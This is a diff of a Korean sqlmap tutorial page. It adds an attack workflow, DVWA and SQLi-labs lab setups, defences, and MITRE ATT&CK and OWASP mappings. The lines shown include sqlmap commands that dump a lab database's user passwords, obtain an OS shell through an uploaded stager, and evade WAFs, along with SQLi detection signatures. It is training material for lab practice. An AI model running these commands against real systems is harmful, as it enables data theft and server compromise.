@@ -13,7 +13,37 @@ categories: [hacking-tools]
 
 ---
 
-## 2. 스캔 옵션
+## 2. 공격 워크플로우
+
+```mermaid
+flowchart LR
+    A[취약 URL 발견] --> B[sqlmap -u]
+    B --> C[--dbs DB 목록]
+    C --> D[-D --tables]
+    D --> E[-T --columns]
+    E --> F[--dump 데이터 추출]
+    F --> G[--os-shell 시스템 장악]
+```
+
+---
+
+## 3. 실습 환경
+
+### DVWA (Docker)
+```bash
+docker run -d -p 80:80 vulnerables/web-dvwa
+# Security Level: Low로 설정 후 SQL Injection 메뉴 실습
+```
+
+### SQLi-labs
+```bash
+docker run -d -p 80:80 acgpiano/sqli-labs
+# 65개 이상의 SQLi 시나리오 제공
+```
+
+---
+
+## 4. 스캔 옵션
 
 Sqlmap은 매우 많은 기능을 제공하지만, 핵심적인 옵션은 다음과 같다.
 
@@ -33,7 +63,7 @@ sqlmap -u "http://[Target IP]/vulnerabilities/sqli/?id=1&Submit=Submit#"
 
 ---
 
-## 3. 공격 실습: 데이터 탈취
+## 5. 공격 실습: 데이터 탈취
 
 Target 서버(`192.9.200.11`)의 DVWA SQL Injection 페이지를 대상으로 데이터베이스 정보를 단계적으로 탈취한다.
 
@@ -53,7 +83,7 @@ sqlmap -u "..." --cookie="..." -D dvwa -T users -C user,password --dump
 
 ---
 
-## 4. 공격 실습: OS Shell
+## 6. 공격 실습: OS Shell
 
 `--os-shell` 옵션은 SQL Injection을 통해 웹 서버에 웹쉘(Stager)을 업로드하고, 이를 통해 운영체제 쉘을 획득하는 강력한 기능이다.
 
@@ -79,7 +109,7 @@ sqlmap -u "http://192.9.200.11/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --
 
 ---
 
-## 5. WAF 우회
+## 7. WAF 우회
 
 실제 환경에서는 WAF(Web Application Firewall)가 Sqlmap의 페이로드를 차단하는 경우가 많다. 다양한 옵션을 활용해 탐지를 우회한다.
 
@@ -117,5 +147,45 @@ sqlmap -u "..." --level=5 --risk=3
 # 결과가 표시되는 별도 페이지 URL 지정
 sqlmap -u "http://target.com/register" --second-url="http://target.com/profile"
 ```
+
+---
+
+## 8. 방어 대책
+
+### 탐지 방법
+*   **WAF 시그니처**: `UNION SELECT`, `' OR 1=1` 등 SQLi 패턴 탐지
+*   **DB 쿼리 로그**: 비정상적인 쿼리 실행 모니터링
+*   **에러 메시지 분석**: SQL 에러가 클라이언트에 노출되는지 확인
+
+### 방어 방법
+*   **Prepared Statement**: 파라미터화된 쿼리 사용 (가장 효과적)
+    ```python
+    cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
+    ```
+*   **ORM 사용**: SQLAlchemy, Hibernate 등
+*   **입력 값 검증**: 화이트리스트 기반 필터링
+*   **최소 권한**: DB 계정에 필요한 권한만 부여
+*   **WAF 적용**: ModSecurity, AWS WAF
+
+---
+
+## MITRE ATT&CK 매핑
+
+| Sqlmap 기능 | ATT&CK 기법 | ID | 단계 |
+|-------------|------------|-----|------|
+| SQLi 탐지/익스플로잇 | Exploit Public-Facing Application | T1190 | Initial Access |
+| `--dbs`, `--dump` | Data from Information Repositories | T1213 | Collection |
+| `--os-shell` | Command and Scripting Interpreter | T1059 | Execution |
+| `--file-read` | Data from Local System | T1005 | Collection |
+| `--file-write` | Ingress Tool Transfer | T1105 | Command and Control |
+
+---
+
+## OWASP Top 10 매핑
+
+| 관련 항목 | 설명 |
+|----------|------|
+| **A05: Injection** | SQL Injection은 대표적인 인젝션 공격 |
+| **A01: Broken Access Control** | SQLi를 통한 인증 우회 및 권한 상승 |
 
 <hr class="short-rule">
